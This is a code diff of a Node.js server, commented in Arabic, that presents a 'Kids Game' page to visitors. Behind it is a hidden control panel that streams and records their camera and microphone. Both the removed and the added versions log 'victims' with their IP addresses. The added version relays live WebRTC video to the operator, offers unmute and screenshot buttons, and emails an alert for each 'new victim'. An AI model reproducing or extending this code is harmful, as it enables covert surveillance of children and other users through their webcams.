@@ -1,30 +1,40 @@
+// server.js — قم بتشغيله بدلاً من PHP
 const express = require('express');
+const http = require('http');
+const socketIo = require('socket.io');
 const path = require('path');
+const nodemailer = require('nodemailer');
 const fs = require('fs');
-const multer = require('multer');
+
 const app = express();
-const PORT = process.env.PORT || 8080;
+const server = http.createServer(app);
+const io = socketIo(server);
 
-// إعداد رفع الملفات (مقاطع الفيديو)
-const storage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    const dir = path.join(__dirname, 'public', 'clips');
-    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-    cb(null, dir);
-  },
-  filename: function (req, file, cb) {
-    // نستخدم sessionId واسم الملف المرسل لتمييز المقطع
-    const sessionId = req.body.sessionId || 'unknown';
-    cb(null, sessionId + '_' + file.originalname);
+const PORT = 8080;
+
+// ⚙️ إعدادات الإيميل — عدلها حسب بريدك (Gmail مع App Password)
+const EMAIL_CONFIG = {
+  from: 'your-email@gmail.com',
+  to: 'your-email@gmail.com',     // بريدك اللي تبغى تجي فيه الإشعارات
+  subject: '🚨 NEW VICTIM CONNECTED - Kids Game',
+  smtp: {
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
+    auth: {
+      user: 'your-email@gmail.com',
+      pass: 'your-app-password'   // استخدم App Password (ليس كلمة المرور العادية)
+    }
   }
-});
-const upload = multer({ storage: storage });
+};
 
-// لوج الجلسات
-const sessionsLog = path.join(__dirname, 'sessions.json');
-if (!fs.existsSync(sessionsLog)) fs.writeFileSync(sessionsLog, '[]');
+const transporter = nodemailer.createTransport(EMAIL_CONFIG.smtp);
 
-app.use(express.json({limit: '50mb'}));
+// تخزين الجلسات النشطة
+const activeSessions = new Map();
+let sessionCounter = 0;
+
+// ========== Serve Static Files ==========
 app.use(express.static(path.join(__dirname, 'public')));
 
 // صفحة الألعاب
@@ -32,76 +42,12 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// API: تسجيل ضحية جديدة
-app.post('/api/log', (req, res) => {
-  const data = req.body;
-  data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  
-  const sessions = JSON.parse(fs.readFileSync(sessionsLog));
-  sessions.push(data);
-  fs.writeFileSync(sessionsLog, JSON.stringify(sessions, null, 2));
-  
-  console.log(`[+] New victim: ${data.sessionId} from ${data.ip}`);
-  res.json({ok: true});
-});
-
-// API: تسجيل PeerID
-app.post('/api/peer-online', (req, res) => {
-  const { peerId, sessionId } = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  console.log(`[📡] Peer online: ${peerId} (${sessionId}) from ${ip}`);
-  
-  // حفظ للوحة التحكم
-  const peersPath = path.join(__dirname, 'active_peers.json');
-  let peers = [];
-  if (fs.existsSync(peersPath)) peers = JSON.parse(fs.readFileSync(peersPath));
-  peers.push({ peerId, sessionId, ip, time: Date.now() });
-  fs.writeFileSync(peersPath, JSON.stringify(peers, null, 2));
-  
-  res.json({ok: true});
-});
-
-// API: قائمة الجلسات النشطة (للوحة التحكم)
-app.get('/api/sessions', (req, res) => {
-  const peersPath = path.join(__dirname, 'active_peers.json');
-  let peers = [];
-  if (fs.existsSync(peersPath)) peers = JSON.parse(fs.readFileSync(peersPath));
-  // تنظيف القديم (أكثر من 5 دقائق)
-  peers = peers.filter(p => Date.now() - p.time < 300000);
-  res.json(peers);
-});
-
-// API: رفع مقطع فيديو (التسجيل المتقطع)
-app.post('/api/upload-clip', upload.single('clip'), (req, res) => {
-  if (!req.file) {
-    return res.status(400).json({ error: 'No file uploaded' });
-  }
-  const sessionId = req.body.sessionId || 'unknown';
-  console.log(`[📹] Received clip from ${sessionId}: ${req.file.filename}`);
-  res.json({ ok: true, filename: req.file.filename });
-});
-
-// API: جلب مقاطع الفيديو لجلسة معينة
-app.get('/api/clips/:sessionId', (req, res) => {
-  const sessionId = req.params.sessionId;
-  const dir = path.join(__dirname, 'public', 'clips');
-  if (!fs.existsSync(dir)) return res.json([]);
-  
-  const files = fs.readdirSync(dir);
-  const userClips = files.filter(f => f.startsWith(sessionId + '_'))
-                         .sort((a, b) => fs.statSync(path.join(dir, b)).mtime.getTime() - fs.statSync(path.join(dir, a)).mtime.getTime()); // ترتيب تنازلي
-  
-  res.json(userClips);
-});
-
-// صفحة التحكم
+// ========== Control Panel ==========
 app.get('/control', (req, res) => {
   res.send(`
-<!DOCTYPE html>
 <html>
 <head>
-  <title>🎮 Control Panel</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎮 Control Panel - Kids Game</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -110,214 +56,377 @@ app.get('/control', (req, res) => {
       color: white;
       padding: 20px;
     }
-    h1 { text-align: center; margin-bottom: 30px; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 36px; }
-    .stats { text-align: center; margin-bottom: 25px; font-size: 18px; }
-    .stats span { background: rgba(255,255,255,0.1); padding: 8px 20px; border-radius: 20px; margin: 0 5px; }
-    .sessions { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
-    .session-card {
-      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-      border-radius: 16px; padding: 20px; backdrop-filter: blur(10px);
+    h1 { 
+      text-align: center;
+      margin-bottom: 30px;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-size: 36px;
     }
-    .session-card h3 { color: #667eea; margin-bottom: 10px; }
-    .session-card .info { font-size: 13px; color: #aaa; margin-bottom: 15px; word-break: break-all; }
-    .session-card video { width: 100%; border-radius: 10px; background: #000; }
-    .session-card .controls { margin-top: 12px; display: flex; gap: 10px; flex-wrap: wrap; }
+    .stats {
+      text-align: center;
+      margin-bottom: 25px;
+      font-size: 18px;
+    }
+    .stats span { 
+      background: rgba(255,255,255,0.1);
+      padding: 8px 20px;
+      border-radius: 20px;
+      margin: 0 5px;
+    }
+    .sessions {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+      gap: 20px;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    .session-card {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 16px;
+      padding: 20px;
+      backdrop-filter: blur(10px);
+    }
+    .session-card h3 {
+      color: #667eea;
+      margin-bottom: 10px;
+    }
+    .session-card .info {
+      font-size: 13px;
+      color: #aaa;
+      margin-bottom: 15px;
+    }
+    .session-card video {
+      width: 100%;
+      border-radius: 10px;
+      background: #000;
+    }
+    .session-card .controls {
+      margin-top: 12px;
+      display: flex;
+      gap: 10px;
+    }
     .session-card button {
-      flex: 1; min-width: 80px; padding: 10px; border: none;
-      border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
     }
     .btn-audio { background: #6bcb77; color: #000; }
     .btn-stop { background: #ff6b6b; color: white; }
     .btn-snap { background: #4d96ff; color: white; }
     .session-card button:active { transform: scale(0.95); }
-    .no-sessions { text-align: center; grid-column: 1 / -1; padding: 60px; color: #666; font-size: 20px; }
-    .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; }
+    .no-sessions {
+      text-align: center;
+      grid-column: 1 / -1;
+      padding: 60px;
+      color: #666;
+      font-size: 20px;
+    }
+    .status-dot {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
     .status-dot.online { background: #6bcb77; box-shadow: 0 0 10px #6bcb77; }
-    .refresh-btn { display: block; margin: 20px auto; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; padding: 12px 40px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; }
-    .peer-id-box { background: rgba(255,255,255,0.05); padding: 8px; border-radius: 8px; font-family: monospace; font-size: 13px; margin: 8px 0; word-break: break-all; }
+    .status-dot.offline { background: #ff6b6b; }
+    .logs {
+      max-width: 800px;
+      margin: 30px auto;
+      background: rgba(0,0,0,0.3);
+      border-radius: 12px;
+      padding: 20px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .logs h3 { margin-bottom: 10px; color: #666; }
+    .logs .log-entry { font-size: 12px; color: #888; padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+    .refresh-btn {
+      display: block;
+      margin: 20px auto;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      border: none;
+      padding: 12px 40px;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
   <h1>🎮 Control Panel</h1>
   <div class="stats">
     <span>🟢 <span id="sessionCount">0</span> active sessions</span>
-    <span>📸 <span id="snapCount">0</span> snapshots</span>
+    <span>📸 <span id="totalSnaps">0</span> snapshots</span>
   </div>
-  <button class="refresh-btn" onclick="fetchSessions()">🔄 Refresh Now</button>
+  <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
   <div class="sessions" id="sessionList"></div>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.1/peerjs.min.js"></script>
+  <div class="logs" id="logs">
+    <h3>📋 Live Logs</h3>
+  </div>
+  
+  <script src="/socket.io/socket.io.js"></script>
   <script>
-    let controlPeer = null;
-    const connections = {};
-    const videoElements = {};
-    let snapCount = 0;
+    const socket = io();
+    const sessionList = document.getElementById('sessionList');
+    const sessionCount = document.getElementById('sessionCount');
+    const logsDiv = document.getElementById('logs');
 
-    // إنشاء Peer للتحكم (معرف ثابت)
-    const ctrlId = 'ctrl-' + Date.now().toString(36);
-    
-    function initControlPeer() {
-      controlPeer = new Peer(ctrlId, {
-        config: {
-          iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' },
-            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
-            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
-          ]
-        }
-      });
-
-      controlPeer.on('open', function() {
-        console.log('Control PeerID:', ctrlId);
-        document.getElementById('sessionCount').textContent = '0 (Ctrl: ' + ctrlId.substring(0,12) + '...)';
-      });
-
-      controlPeer.on('connection', function(conn) {
-        // اتصال وارد من ضحية
-        const sid = conn.peer;
-        connections[sid] = conn;
-        
-        conn.on('data', function(data) {
-          if (data.type === 'hello') {
-            addSessionCard(sid, data.sessionId, data.ua);
-          }
-        });
-      });
-
-      controlPeer.on('call', function(call) {
-        const sid = call.peer;
-        call.answer(); // لا نرسل فيديو (نحن control)
-        
-        call.on('stream', function(remoteStream) {
-          const vid = document.getElementById('video-' + sid);
-          if (vid) {
-            vid.srcObject = remoteStream;
-            vid.play();
-          }
-        });
-      });
+    function addLog(msg) {
+      const entry = document.createElement('div');
+      entry.className = 'log-entry';
+      entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+      logsDiv.appendChild(entry);
+      logsDiv.scrollTop = logsDiv.scrollHeight;
     }
 
-    function addSessionCard(peerId, sessionId, ua) {
-      const list = document.getElementById('sessionList');
-      
-      // تحقق إذا كان موجود
-      if (document.getElementById('card-' + peerId)) return;
+    const peerConnections = {};
+    const remoteStreams = {};
 
-      const card = document.createElement('div');
-      card.className = 'session-card';
-      card.id = 'card-' + peerId;
+    socket.on('connect', function() {
+      addLog('✅ Connected to signaling server');
+    });
 
-      card.innerHTML = \`
-        <h3><span class="status-dot online"></span> \${sessionId}</h3>
-        <div class="info">
-          PeerID: <span class="peer-id-box">\${peerId}</span><br>
-          UA: \${(ua || 'N/A').substring(0, 80)}<br>
-          Time: \${new Date().toLocaleTimeString()}<br>
-          <span style="color:#f39c12; font-weight:bold;">⏱️ المقطع التالي بعد: <span id="timer-\${peerId}">20</span> ثانية</span>
-        </div>
-        <div class="clips-container" id="clips-\${peerId}">جاري سحب المقاطع...</div>
-        <div class="controls">
-          <button class="btn-snap" onclick="fetchClips('\${peerId}')">🔄 تحديث المقاطع</button>
-        </div>
-      \`;
+    socket.on('session-list', function(sessions) {
+      sessionList.innerHTML = '';
+      sessionCount.textContent = sessions.length;
 
-      list.appendChild(card);
-      document.getElementById('sessionCount').textContent = list.children.length;
-      
-      // Timer Logic
-      let timeLeft = 20;
-      setInterval(() => {
-        timeLeft--;
-        if (timeLeft < 0) timeLeft = 20; // إعادة ضبط العداد
-        const timerEl = document.getElementById('timer-' + peerId);
-        if (timerEl) timerEl.textContent = timeLeft;
-      }, 1000);
-
-      // Fetch clips periodically
-      fetchClips(peerId);
-      setInterval(() => fetchClips(peerId), 10000); // تحديث كل 10 ثواني لضمان سرعة الظهور
-    }
-
-    function fetchClips(peerId) {
-      fetch('/api/clips/' + peerId)
-        .then(res => res.json())
-        .then(clips => {
-          const container = document.getElementById('clips-' + peerId);
-          if (!container) return;
-          
-          // إذا كان لدينا مقاطع سابقة ونزلت مقاطع جديدة، يمكننا إعادة ضبط العداد بصرياً
-          const lastCount = container.dataset.clipCount || 0;
-          if (clips.length > lastCount) {
-             const timerEl = document.getElementById('timer-' + peerId);
-             if (timerEl) timerEl.textContent = '0 (وصل!)';
-          }
-          container.dataset.clipCount = clips.length;
-
-          if (clips.length === 0) {
-            container.innerHTML = '<p style="color:#aaa;">لا توجد مقاطع بعد، يرجى الانتظار...</p>';
-            return;
-          }
-          let html = '<h4 style="margin:5px 0;">المقاطع المسجلة (' + clips.length + ')</h4><div style="max-height:250px;overflow-y:auto;">';
-          clips.forEach(clip => {
-            html += '<div style="margin-bottom:10px; background:rgba(0,0,0,0.3); padding:5px; border-radius:5px;">'
-                 + '<video src="/clips/' + clip + '" controls style="width:100%; border-radius:5px; background:#000;"></video>'
-                 + '<div style="text-align:right;"><a href="/clips/' + clip + '" download style="color:#4caf50;text-decoration:none;">💾 تحميل المقطع</a></div>'
-                 + '</div>';
-          });
-          html += '</div>';
-          container.innerHTML = html;
-        }).catch(err => console.log('Error fetching clips:', err));
-    }
-
-    async function fetchSessions() {
-      try {
-        const res = await fetch('/api/sessions');
-        const sessions = await res.json();
-        
-        const list = document.getElementById('sessionList');
-        
-        if (sessions.length === 0) {
-          if (!list.querySelector('.no-sessions')) {
-            list.innerHTML = '<div class="no-sessions">🔴 Waiting for victims...<br><small>Make sure someone opens the game page and allows camera/mic</small></div>';
-          }
-          document.getElementById('sessionCount').textContent = '0';
-          return;
-        }
-
-        // إزالة رسالة "no sessions"
-        const noSess = list.querySelector('.no-sessions');
-        if (noSess) noSess.remove();
-
-        sessions.forEach(s => {
-          addSessionCard(s.peerId, s.sessionId, '');
-        });
-      } catch(e) {
-        console.log('Fetch error:', e);
+      if (sessions.length === 0) {
+        sessionList.innerHTML = '<div class="no-sessions">🔴 Waiting for victims to connect...</div>';
+        return;
       }
-    }
 
-    // بدء التحكم
-    initControlPeer();
-    
-    // جلب الجلسات كل 5 ثواني
-    setInterval(fetchSessions, 5000);
-    fetchSessions();
+      sessions.forEach(sid => {
+        if (document.getElementById('card-' + sid)) return;
+
+        const card = document.createElement('div');
+        card.className = 'session-card';
+        card.id = 'card-' + sid;
+
+        const v = document.createElement('video');
+        v.id = 'video-' + sid;
+        v.autoplay = true;
+        v.playsinline = true;
+        v.style.width = '100%';
+        v.style.borderRadius = '10px';
+        v.muted = true;
+
+        const info = document.createElement('div');
+        info.className = 'info';
+        info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong>';
+
+        const controlsDiv = document.createElement('div');
+        controlsDiv.className = 'controls';
+        
+        const btnAudio = document.createElement('button');
+        btnAudio.className = 'btn-audio';
+        btnAudio.textContent = '🔊 Unmute Audio';
+        btnAudio.onclick = function() {
+          v.muted = !v.muted;
+          btnAudio.textContent = v.muted ? '🔊 Unmute Audio' : '🔇 Mute Audio';
+        };
+
+        const btnSnap = document.createElement('button');
+        btnSnap.className = 'btn-snap';
+        btnSnap.textContent = '📸 Screenshot';
+        btnSnap.onclick = function() {
+          const canvas = document.createElement('canvas');
+          canvas.width = v.videoWidth;
+          canvas.height = v.videoHeight;
+          canvas.getContext('2d').drawImage(v, 0, 0);
+          const link = document.createElement('a');
+          link.download = 'snapshot_' + sid + '_' + Date.now() + '.png';
+          link.href = canvas.toDataURL();
+          link.click();
+        };
+
+        controlsDiv.appendChild(btnAudio);
+        controlsDiv.appendChild(btnSnap);
+
+        card.appendChild(info);
+        card.appendChild(v);
+        card.appendChild(controlsDiv);
+        sessionList.appendChild(card);
+
+        // إنشاء Peer Connection للتحكم
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        peerConnections[sid] = pc;
+
+        pc.ontrack = function(event) {
+          if (event.streams && event.streams[0]) {
+            v.srcObject = event.streams[0];
+            remoteStreams[sid] = event.streams[0];
+            addLog('📡 Stream received from ' + sid);
+          }
+        };
+
+        pc.onicecandidate = function(event) {
+          if (event.candidate) {
+            socket.emit('ice-candidate', { target: sid, candidate: event.candidate });
+          }
+        };
+
+        pc.oniceconnectionstatechange = function() {
+          if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
+            addLog('🔴 Session ' + sid + ' disconnected');
+            if (card.parentNode) card.remove();
+            delete peerConnections[sid];
+            delete remoteStreams[sid];
+          }
+        };
+
+        // طلب البث من الضحية
+        socket.emit('request-stream', { target: sid });
+
+        socket.on('video-offer-' + sid, function(offer) {
+          pc.setRemoteDescription(new RTCSessionDescription(offer))
+            .then(() => pc.createAnswer())
+            .then(answer => pc.setLocalDescription(answer))
+            .then(() => socket.emit('video-answer', { target: sid, answer: pc.localDescription }))
+            .catch(e => console.log(e));
+        });
+
+        socket.on('ice-candidate-' + sid, function(candidate) {
+          pc.addIceCandidate(new RTCIceCandidate(candidate));
+        });
+      });
+    });
+
+    socket.on('new-session', function(sid) {
+      addLog('🆕 New victim connected: ' + sid);
+      // تحديث القائمة
+      socket.emit('get-sessions');
+    });
+
+    socket.on('session-gone', function(sid) {
+      addLog('🔴 Session ended: ' + sid);
+      const card = document.getElementById('card-' + sid);
+      if (card && card.parentNode) card.remove();
+      delete peerConnections[sid];
+      delete remoteStreams[sid];
+    });
+
+    // طلب القائمة كل 5 ثواني
+    setInterval(() => socket.emit('get-sessions'), 5000);
+    socket.emit('get-sessions');
   </script>
 </body>
 </html>
   `);
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+// ========== Socket.IO Signaling ==========
+io.on('connection', (socket) => {
+  const clientIP = socket.handshake.address;
+  const sessionId = 'SESS-' + (++sessionCounter).toString(16).toUpperCase() + '-' + Date.now().toString(36);
+
+  console.log(`[+] New connection: ${sessionId} from ${clientIP}`);
+
+  // هل هذا متصل من Control Panel؟
+  socket.on('get-sessions', () => {
+    // المستعلم هو Control Panel
+    socket.isControl = true;
+    const activeList = Array.from(activeSessions.keys());
+    socket.emit('session-list', activeList);
+  });
+
+  // Victim يرسل offer
+  socket.on('offer', (offer) => {
+    socket.sessionId = sessionId;
+    activeSessions.set(sessionId, { socket, ip: clientIP, connectedAt: Date.now() });
+
+    // إرسال إيميل
+    const mailBody = `
+🚨 NEW VICTIM CONNECTED 🚨
+
+Session ID: ${sessionId}
+IP Address: ${clientIP}
+Time: ${new Date().toLocaleString()}
+User-Agent: ${socket.handshake.headers['user-agent'] || 'N/A'}
+
+Open Control Panel: http://localhost:${PORT}/control
+    `;
+
+    transporter.sendMail({
+      from: EMAIL_CONFIG.from,
+      to: EMAIL_CONFIG.to,
+      subject: EMAIL_CONFIG.subject + ' - ' + sessionId,
+      text: mailBody
+    }).then(() => {
+      console.log(`[EMAIL] Alert sent for ${sessionId}`);
+    }).catch(err => {
+      console.log(`[EMAIL] Failed to send: ${err.message}`);
+    });
+
+    // إعلام Control Panels
+    io.emit('new-session', sessionId);
+
+    // حفظ offer للـ control panels
+    socket.offer = offer;
+    console.log(`[SIGNAL] Offer received from ${sessionId}`);
+  });
+
+  // Control Panel requests stream
+  socket.on('request-stream', (data) => {
+    const victim = activeSessions.get(data.target);
+    if (victim) {
+      victim.socket.emit('request-stream', { cpId: socket.id });
+    }
+  });
+
+  // Victim sends offer to CP
+  socket.on('video-offer', (data) => {
+    socket.to(data.cpId).emit('video-offer-' + socket.sessionId, data.offer);
+  });
+
+  // CP sends answer to Victim
+  socket.on('video-answer', (data) => {
+    const victim = activeSessions.get(data.target);
+    if (victim) {
+      victim.socket.emit('video-answer', { cpId: socket.id, answer: data.answer });
+    }
+  });
+
+  // ICE candidates
+  socket.on('ice-candidate', (data) => {
+    if (data.target) {
+      // From CP to Victim
+      const victim = activeSessions.get(data.target);
+      if (victim) victim.socket.emit('ice-candidate', { cpId: socket.id, candidate: data.candidate });
+    } else if (data.cpId) {
+      // From Victim to CP
+      socket.to(data.cpId).emit('ice-candidate-' + socket.sessionId, data.candidate);
+    }
+  });
+
+  socket.on('disconnect', () => {
+    if (socket.sessionId) {
+      activeSessions.delete(socket.sessionId);
+      io.emit('session-gone', socket.sessionId);
+      console.log(`[-] Session ended: ${socket.sessionId}`);
+    }
+  });
+});
+
+// ========== Start Server ==========
+server.listen(PORT, '0.0.0.0', () => {
   console.log(`
 ╔══════════════════════════════════════════╗
-║  🎮 Kids Game Server Running             ║
+║    🎮 Kids Game Server Running           ║
 ╠══════════════════════════════════════════╣
-║  Game Page:  /                           ║
-║  Control:    /control                    ║
-║  Port:       ${PORT}                      ║
+║  Game Page:  http://localhost:${PORT}      ║
+║  Control:    http://localhost:${PORT}/control ║
+║  Port:       ${PORT}                       ║
+║  Email Alerts: ${EMAIL_CONFIG.smtp.auth.user ? '✅ Active' : '❌ Not configured'}  ║
 ╚══════════════════════════════════════════╝
   `);
 });
